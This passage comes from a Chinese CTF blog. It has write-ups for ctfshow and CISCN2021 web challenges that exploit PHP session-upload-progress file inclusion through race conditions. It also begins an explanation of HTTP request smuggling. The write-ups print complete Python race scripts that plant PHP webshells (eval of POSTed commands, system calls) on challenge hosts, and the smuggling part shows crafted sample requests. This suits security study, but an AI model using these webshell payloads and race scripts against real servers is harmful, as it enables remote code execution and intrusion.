alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web82"><a href="#ctfhshow-web入门-web82" class="headerlink" title="ctfhshow [web入门]-web82"></a>ctfhshow [web入门]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS和条件竞争进行文件包含。</p><p>和上面题一样，直接一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web149"><a href="#ctfhshow-web入门-web149" class="headerlink" title="ctfhshow [web入门]-web149"></a>ctfhshow [web入门]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1</span>.php<br>show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():<br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            <span class="hljs-built_in">print</span>(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># 将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure><p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="CISCN2021-middle-source"><a href="#CISCN2021-middle-source" class="headerlink" title="CISCN2021 - middle_source"></a>CISCN2021 - middle_source</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is in some file in /etc &quot;</span>;<br>    <span class="hljs-variable">$fielf</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;field&quot;</span>];<br>    <span class="hljs-variable">$cf</span>=<span class="hljs-string">&quot;/tmp/app_auth/cfile/&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cf&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$cf</span>))&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$cf</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$$field</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span> your flag is in some file in /etc<br></code></pre></td></tr></table></figure><p>访<code>问cf=../../../var/www/html/you_can_seeeeeeee_me.php</code>，可以看到phpinfo信息</p><p>禁用了一大堆函数，可以利用PHP_SESSION_UPLOAD_PROGRESS包含Session文件<br><img src="https://img-blog.csdnimg.cn/20210603192632564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到session存储路径是<code>/var/lib/php/sessions/aidbbhcjei</code><br><img src="https://img-blog.csdnimg.cn/20210603192626407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>修改后的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">import io<br>import requests<br>import threading<br><br>url=<span class="hljs-string">&#x27;http://192.168.43.86:24081&#x27;</span><br>sessid = <span class="hljs-string">&#x27;atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;<br>def write(session):<br> <span class="hljs-keyword">while</span> True:<br>  f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>   resp = session.post(url, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php var_dump(scandir(&quot;/etc&quot;));?&gt;&#x27;</span>&#125;, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )<br>def <span class="hljs-built_in">read</span>(session):<br> <span class="hljs-keyword">while</span> True:<br>  data=&#123;<br>  <span class="hljs-string">&#x27;filed&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-string">&#x27;cf&#x27;</span>:<span class="hljs-string">&#x27;../../../../../../var/lib/php/sessions/aidbbhcjei/sess_&#x27;</span>+sessid<br>  &#125;<br>  resp = session.post(url,data=data)<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>  <span class="hljs-built_in">print</span>(resp.text)<br>   event.clear()<br>    <span class="hljs-keyword">else</span>:<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]&quot;</span>)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br> event=threading.Event()<br> with requests.session() as session:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30): <br>   threading.Thread(target=write,args=(session,)).start()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,30):<br>   threading.Thread(target=<span class="hljs-built_in">read</span>,args=(session,)).start()<br> event.set()<br></code></pre></td></tr></table></figure><p>修改脚本，目录一层一层往下看就有flag了</p>]]></content>
    
    
    
    <tags>
      
      <tag>条件竞争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP请求走私漏洞</title>
    <link href="/posts/280130674/"/>
    <url>/posts/280130674/</url>
    
    <content type="html"><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><ul><li>利用Content-Length字段来判定请求体的内容长度 </li><li>利用Transfer-Encoding字段来判定请求体的结束位置</li></ul><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h3><p>Content-Length即为实体长度。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。通常如果 Content-Length 比实际长度短，会造成内容被截断；如果比实体内容长，会造成 pending。</p><h3 id="Transfer-Encoding"><a href="#Transfer-Encoding" class="headerlink" title="Transfer-Encoding"></a>Transfer-Encoding</h3><p>历史上 Transfer-Encoding 可以有多种取值，但最新的 HTTP 规范里，只定义了一种传输编码：分块编码（chunked）。</p><p>分块编码相当简单，在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，报文中的实体需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的 CRLF（\r\n），也不包括分块数据结尾的 CRLF。最后一个分块长度值必须为 0，对应的分块数据没有内容，表示实体结束。</p><h3 id="CL与TE解析优先级顺序"><a href="#CL与TE解析优先级顺序" class="headerlink" title="CL与TE解析优先级顺序"></a>CL与TE解析优先级顺序</h3><p>CL表示Content-Length，TE表示Transfer-Encoding。优先级顺序详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3 </a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a message <span class="hljs-keyword">is</span> received <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">and</span> a<br>Content-Length <span class="hljs-keyword">header</span> field, the Transfer-<span class="hljs-keyword">Encoding</span> overrides the<br>Content-Length. Such a message might indicate an attempt <span class="hljs-keyword">to</span> <span class="hljs-keyword">perform</span><br>request smuggling (Section <span class="hljs-number">9.5</span>) <span class="hljs-keyword">or</span> response splitting (Section <span class="hljs-number">9.4</span>)<br><span class="hljs-keyword">and</span> ought <span class="hljs-keyword">to</span> be handled <span class="hljs-keyword">as</span> an error. A sender MUST remove the received Content-Length field prior <span class="hljs-keyword">to</span> forwarding such a message downstream.<br></code></pre></td></tr></table></figure><p>TE 优先于 CL ，但可以通过一些方式绕过</p><h2 id="请求走私分类"><a href="#请求走私分类" class="headerlink" title="请求走私分类"></a>请求走私分类</h2><p>请求走私攻击包括将Content-Length标头和Transfer-Encoding 标头都放入单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL不为0:前端代理服务器允许请求携带请求体，而后端服务器不允许请求携带请求体。</li><li>CL-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li><li>CL-TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer- Encoding标头。</li><li>TE-TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。</li><li>TE-CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。</li></ul><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响,这里以GET请求为例。</p><p>当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p>比如构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 44\r\n<br>\r\n<br>GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p><strong>注：\r\n表示 CRLF即换行</strong></p><p>前端服务器处理了Content-Length，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求：</p><p>第一个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET / HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><p>第二个请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /secret HTTP/1.1\r\n<br>Host: demo.com\r\n<br></code></pre></td></tr></table></figure><h3 id="CL-CL漏洞"><a href="#CL-CL漏洞" class="headerlink" title="CL-CL漏洞"></a>CL-CL漏洞</h3><p><strong>RFC7230规范</strong>：在RFC7230的<a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">第3.3.3节</a>中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。</p><p>构造请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 5\r\n<br>Content-Length: 6\r\n<br>\r\n<br>12345\r\n<br>a<br></code></pre></td></tr></table></figure><p>得到响应，返回400 Bad Request<br><img src="https://img-blog.csdnimg.cn/20210406203744401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>触发过程</strong></p><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。</p><h3 id="CL-TE漏洞"><a href="#CL-TE漏洞" class="headerlink" title="CL-TE漏洞"></a>CL-TE漏洞</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。</p><p><a 